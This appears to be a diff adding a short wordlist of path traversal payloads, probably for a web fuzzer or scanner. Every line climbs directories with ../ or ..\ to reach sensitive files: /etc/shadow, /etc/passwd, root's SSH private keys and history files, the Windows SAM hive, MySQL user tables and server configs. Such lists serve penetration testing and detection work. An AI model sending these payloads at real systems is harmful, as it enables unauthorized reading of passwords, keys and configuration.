@@ -1,0 +1,21 @@
+..\..\..\..\..\..\..\..\..\..\boot.ini 
+..\..\..\..\..\..\..\..\..\..\Windows\System32\inetsrv\MetaBase.xml 
+..\..\..\..\..\..\..\..\..\..\Windows\repair\sam 
+..\..\..\..\..\..\..\..\..\..\Program Files\mysql\my.ini 
+..\..\..\..\..\..\..\..\..\..\Program Files\mysql\data\mysql\user.MYD 
+..\..\..\..\..\..\..\..\..\..\Windows\php.ini 
+..\..\..\..\..\..\..\..\..\..\Windows\my.ini 
+../../../../../../../../root/.ssh/authorized_keys
+../../../../../../../../root/.ssh/id_rsa
+../../../../../../../../root/.ssh/id_rsa.keystore
+../../../../../../../../root/.ssh/known_hosts
+../../../../../../../../etc/passwd 
+../../../../../../../../etc/shadow 
+../../../../../../../../etc/my.cnf 
+../../../../../../../../etc/httpd/conf/httpd.conf 
+../../../../../../../../root/.bash_history 
+../../../../../../../../root/.mysql_history 
+../../../../../../../../proc/self/fd/fd[0-9]*
+../../../../../../../../proc/mounts
+../../../../../../../../proc/config.gz
+../../../../../proc/self/cmdline
